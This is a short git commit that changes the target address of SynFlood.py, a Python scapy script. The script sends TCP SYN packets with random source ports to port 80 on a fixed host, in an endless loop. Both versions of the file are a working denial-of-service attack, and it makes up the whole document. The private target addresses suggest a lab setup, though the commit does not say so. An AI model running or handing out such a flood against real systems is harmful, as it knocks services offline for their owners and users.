24002fa5c9170002fba53e8745c53a2a6ae9fe5f
fatinrohimi <48275204+fatinrohimi@users.noreply.github.com>
2020-07-10 11:17:03 +0800

    Update SynFlood.py

--- SynFlood.py
+++ SynFlood.py
@@ -2,5 +2,5 @@
 from scapy.all import *
 import scapy.all.IP
 import scapy.all.TCP
-p=IP(dst='10.50.0.1')/TCP(flags="S",  sport=RandShort(),  dport=int(80))
+p=IP(dst='192.168.128.132')/TCP(flags="S",  sport=RandShort(),  dport=int(80))
 send(p,  verbose=0, loop=1)
